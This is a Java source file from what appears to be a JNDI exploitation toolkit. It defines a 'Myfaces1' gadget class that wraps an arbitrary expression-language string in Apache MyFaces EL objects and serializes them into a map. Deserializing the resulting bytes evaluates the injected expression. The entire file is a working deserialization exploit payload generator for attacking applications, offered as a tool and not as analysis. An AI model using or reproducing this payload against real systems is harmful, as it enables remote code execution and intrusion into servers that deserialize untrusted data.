package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;

import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.apache.myfaces.context.servlet.FacesContextImpl;
import org.apache.myfaces.context.servlet.FacesContextImplBase;
import org.apache.myfaces.el.CompositeELResolver;
import org.apache.myfaces.el.unified.FacesELContext;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;

import javax.el.ELContext;
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies{
    @Override
    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        return makeExpressionPayload(param[0]);
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }

    public static byte[] makeExpressionPayload(String expr) throws Exception {
        FacesContextImpl fc        = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
        ELContext        elContext = new FacesELContext(new CompositeELResolver(), fc);
        Reflections.getField(FacesContextImplBase.class, "_elContext").set(fc, elContext);
        ExpressionFactory expressionFactory = ExpressionFactory.newInstance();

        ValueExpression                 ve1 = expressionFactory.createValueExpression(elContext, expr, Object.class);
        ValueExpressionMethodExpression e   = new ValueExpressionMethodExpression(ve1);
        ValueExpression                 ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class);
        ValueExpressionMethodExpression e2  = new ValueExpressionMethodExpression(ve2);

        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(Gadgets.makeMap(e2, e));
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
